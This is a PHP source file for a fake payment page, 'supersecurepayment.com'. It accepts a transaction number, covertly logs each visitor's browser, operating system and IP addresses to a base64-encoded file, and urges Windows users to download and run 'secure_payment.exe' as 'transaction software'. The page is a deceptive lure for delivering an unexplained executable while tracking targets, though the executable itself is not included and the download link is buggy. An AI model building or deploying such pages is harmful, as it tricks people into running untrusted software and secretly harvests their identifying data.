<?php
    if(!isset($_POST['trans']))
    {
        die("Something went wrong");
    }
    $tr_nr=$_POST['trans'];
    $valid = "1HTD-3A46-3X29-7R09";

    if($tr_nr !== $valid)
    {
        die("Invalid Transaction number");
    }


    class OS_BR{

        private $agent = "";
        private $info = array();
    
        function __construct(){
            $this->agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : NULL;
            $this->getBrowser();
            $this->getOS();
        }
    
        function getBrowser(){
            $browser = array("Navigator"            => "/Navigator(.*)/i",
                             "Firefox"              => "/Firefox(.*)/i",
                             "Internet Explorer"    => "/MSIE(.*)/i",
                             "Google Chrome"        => "/chrome(.*)/i",
                             "MAXTHON"              => "/MAXTHON(.*)/i",
                             "Opera"                => "/Opera(.*)/i",
                             );
            foreach($browser as $key => $value){
                if(preg_match($value, $this->agent)){
                    $this->info = array_merge($this->info,array("Browser" => $key));
                    $this->info = array_merge($this->info,array(
                      "Version" => $this->getVersion($key, $value, $this->agent)));
                    break;
                }else{
                    $this->info = array_merge($this->info,array("Browser" => "UnKnown"));
                    $this->info = array_merge($this->info,array("Version" => "UnKnown"));
                }
            }
            return $this->info['Browser'];
        }
    
        function getOS(){
            $OS = array("Windows"   =>   "/Windows/i",
                        "Linux"     =>   "/Linux/i",
                        "Unix"      =>   "/Unix/i",
                        "Mac"       =>   "/Mac/i"
                        );
    
            foreach($OS as $key => $value){
                if(preg_match($value, $this->agent)){
                    $this->info = array_merge($this->info,array("Operating System" => $key));
                    break;
                }
            }
            return $this->info['Operating System'];
        }
    
        function getVersion($browser, $search, $string){
            $browser = $this->info['Browser'];
            $version = "";
            $browser = strtolower($browser);
            preg_match_all($search,$string,$match);
            switch($browser){
                case "firefox": $version = str_replace("/","",$match[1][0]);
                break;
    
                case "internet explorer": $version = substr($match[1][0],0,4);
                break;
    
                case "opera": $version = str_replace("/","",substr($match[1][0],0,5));
                break;
    
                case "navigator": $version = substr($match[1][0],1,7);
                break;
    
                case "maxthon": $version = str_replace(")","",$match[1][0]);
                break;
    
                case "google chrome": $version = substr($match[1][0],1,10);
            }
            return $version;
        }
    
        function showInfo($switch){
            $switch = strtolower($switch);
            switch($switch){
                case "browser": return $this->info['Browser'];
                break;
    
                case "os": return $this->info['Operating System'];
                break;
    
                case "version": return $this->info['Version'];
                break;
    
                case "all" : return array($this->info["Version"], 
                  $this->info['Operating System'], $this->info['Browser']);
                break;
    
                default: return "Unkonw";
                break;
    
            }
        }
    }

    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    function getOS() { 

        global $user_agent;

        $os_platform  = "Unknown OS Platform";

        $os_array     = array(
                            '/windows nt 10/i'      =>  'Windows',
                            '/windows nt 6.3/i'     =>  'Windows',
                            '/windows nt 6.2/i'     =>  'Windows',
                            '/windows nt 6.1/i'     =>  'Windows',
                            '/windows nt 6.0/i'     =>  'Windows',
                            '/windows nt 5.2/i'     =>  'Windows',
                            '/windows nt 5.1/i'     =>  'Windows',
                            '/windows xp/i'         =>  'Windows',
                            '/windows nt 5.0/i'     =>  'Windows',
                            '/windows me/i'         =>  'Windows',
                            '/win98/i'              =>  'Windows',
                            '/win95/i'              =>  'Windows',
                            '/win16/i'              =>  'Windows',
                            '/macintosh|mac os x/i' =>  'Mac',
                            '/mac_powerpc/i'        =>  'Mac',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );

        foreach ($os_array as $regex => $value)
            if (preg_match($regex, $user_agent))
                $os_platform = $value;

        return $os_platform;
    }


    $welcum="Welcome to the supersecurepayment.com transaction interface";
    $title="Transaction Nr.: ".$tr_nr;
    $content="To complete the transaction download the transaction software.";

    $linux_link;
    $win_link="./secure_payment.exe";
    $mac_link;

    $os=getOS();
    $dl_link;
    if($os=='Windows')
    {
        $dl_link=$win_link;
    }
    $prox="";
    if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $prox=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    $ip="";
    if(isset($_SERVER['REMOTE_ADDR']))
    {
        $ip=$_SERVER['REMOTE_ADDR'];
    };
    $milliseconds = round(microtime(true) * 1000);
    $myfile = fopen("$tr_nr.txt", "a");
    $obj = new OS_BR();
    $txt= implode(";", $obj->showInfo("all"));
    $txt = "$txt;$ip;$prox\n";
    $txt = base64_encode($txt);
    fwrite($myfile, $txt);
    fclose($myfile);
    
    $warning="Make sure to check your transaction before you download the software! Also make sure to check it with <a href=\"https://www.virustotal.com/#/home/upload\">Virustotal</a> to make sure it's the right software.";
?>
<head>
    <title><?php echo $title; ?></title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link href="style.css" rel="stylesheet" />
    <script src="main.js"></script>
</head>
<body>
  <h1><?php echo $title; ?></h1>
  <h3><?php echo $welcum?></h3>
  <h4><?php echo $content ?></h4>
  <h5>We accept credit cards, western union and BTC</h5>
  <img src="../img/payment.png" />
<div>
<br />
    <a class="btn btn-primary" href="$dl_link" download="SecurePayment.exe">Download</a>
    <br />
    <br/>
    <h5><span class="badge badge-info">Info</span> By downloading our software you accept our <a href="tos.html">ToS</a></h5>
</div>
<br />
<p>
<?php echo $warning; ?>
</p>
</body>